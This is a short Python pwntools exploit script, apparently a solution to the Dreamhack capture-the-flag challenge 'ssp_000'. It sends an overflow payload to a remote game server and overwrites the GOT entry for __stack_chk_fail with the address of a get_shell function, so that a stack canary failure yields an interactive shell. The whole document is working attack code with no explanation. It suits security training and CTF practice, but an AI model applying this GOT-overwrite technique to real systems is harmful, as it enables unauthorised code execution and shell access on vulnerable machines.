from pwn import *


def slog(name, addr):
  return success(": ".join([name, hex(addr)]))
  
p=remote("host3.dreamhack.games", 9411)
e = ELF("./ssp_000")

get_shell = e.symbols['get_shell']
stack_chk_fail_got = e.got['__stack_chk_fail']

payload = b'A' * 0x50
p.sendline(payload)

print("[+] stack_chk_fail: ", hex(stack_chk_fail_got))

p.sendlineafter("Addr : ", str(stack_chk_fail_got))
p.sendlineafter("Value : ", str(get_shell))

p.interactive()

